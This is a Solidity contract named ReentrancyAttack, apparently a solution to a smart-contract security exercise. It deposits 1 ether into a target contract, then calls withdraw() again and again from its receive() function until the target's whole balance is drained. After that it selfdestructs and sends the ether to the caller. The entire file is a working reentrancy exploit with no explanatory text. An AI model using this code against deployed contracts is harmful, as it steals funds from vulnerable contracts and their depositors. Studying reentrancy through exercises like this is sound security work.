// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentracy{
    function donate(address to) external payable;
    function withdraw(uint256 amount) external;
}

// import "../Reentrancy.sol";

contract ReentrancyAttack{
    IReentracy private immutable target;

    constructor (address payable _target) {
        target = IReentracy(_target);
    }

    function attack() payable external {
        target.donate{value:1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "Target balance is greater then 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable{
        uint256 amount = min(1e18, address(target).balance);
        if(amount > 0){ 
        target.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint){
        return x <= y ? x :y;
    }

}